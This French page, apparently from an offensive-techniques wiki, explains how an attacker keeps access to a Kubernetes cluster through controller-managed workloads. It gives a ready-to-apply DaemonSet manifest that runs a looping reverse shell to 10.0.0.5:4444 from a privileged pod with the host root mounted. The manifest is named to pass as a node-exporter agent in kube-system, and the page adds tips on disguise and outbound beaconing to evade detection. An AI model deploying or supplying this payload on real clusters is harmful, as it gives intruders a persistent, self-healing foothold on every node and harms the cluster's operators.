---
order: 1
title: "Charges de travail malveillantes : des deployments et daemonsets qui rétablissent l'accès"
description: "Une charge de travail gérée par un contrôleur persiste parce que le contrôleur recrée ses pods. Un attaquant déploie un Deployment ou un DaemonSet qui émet un beacon ou ouvre une backdoor, et le contrôleur de ReplicaSet ou de DaemonSet le redémarre chaque fois qu'il est tué. Un DaemonSet pose en outre un pod sur chaque nœud, offrant une présence auto-réparatrice à l'échelle de tous les nœuds."
keywords:
  - deployment
  - daemonset
  - persistance
  - auto-réparation
  - pod backdoor
---

# Charges de travail malveillantes

Supprimer le pod d'un attaquant est vain quand un contrôleur en est propriétaire : Deployments, ReplicaSets, StatefulSets et DaemonSets existent précisément pour recréer les pods qui disparaissent. Un attaquant utilise cette auto-réparation contre le défenseur en déployant une charge de travail dont les conteneurs émettent un beacon vers un canal de commande ou ouvrent une backdoor, si bien que tuer un pod ne fait que déclencher son remplacement. Un DaemonSet est la forme la plus forte, plaçant un pod sur chaque nœud et survivant ainsi à la perte de n'importe quel nœud tout en offrant une portée à l'échelle de tous les nœuds.

Nécessite les droits de création sur un type de charge de travail :

```bash
kubectl auth can-i create deployments -n <ns>
kubectl auth can-i create daemonsets -n <ns>
```

## Backdoor auto-réparatrice

```bash
# a DaemonSet: one beaconing pod per node, recreated if deleted
cat <<YAML | kubectl apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata: { name: node-exporter-agent, namespace: kube-system }   # innocuous name
spec:
  selector: { matchLabels: { app: node-exporter-agent } }
  template:
    metadata: { labels: { app: node-exporter-agent } }
    spec:
      containers:
      - name: agent
        image: alpine
        command: ["/bin/sh","-c","while :; do sh -i >& /dev/tcp/10.0.0.5/4444 0>&1; sleep 60; done"]
        securityContext: { privileged: true }
        volumeMounts: [{ name: h, mountPath: /host }]
      volumes: [{ name: h, hostPath: { path: / } }]
YAML
```

Marquer le pod comme privilégié avec un montage de l'hôte combine persistance et accès au nœud, si bien que chaque pod recréé est aussi un point d'appui sur le nœud.

## Notes d'exploitation

- Choisissez un contrôleur pour que le pod s'auto-répare ; un Pod nu supprimé reste supprimé, tandis qu'un pod de Deployment ou de DaemonSet revient. Le DaemonSet se déploie aussi sur chaque nœud.
- Déguisez-le en agent légitime (noms de type `node-exporter`, `fluentd`, `kube-proxy`) dans un namespace système chargé pour vous fondre parmi les charges de travail attendues.
- Un beacon sortant est plus fiable qu'un listener entrant car l'egress du cluster est généralement autorisé tandis que l'ingress est filtré ; associez à un montage privilégié de l'hôte pour que chaque pod soit aussi un accès au nœud selon [Pod privilégié](../pod-escape-to-node/privileged-pod.md).

## Références

- [Kubernetes: DaemonSet](https://kubernetes.io/docs/concepts/workloads/controllers/daemonset/)
- [Kubernetes: Deployments](https://kubernetes.io/docs/concepts/workloads/controllers/deployment/)
- [Microsoft: Kubernetes threat matrix](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
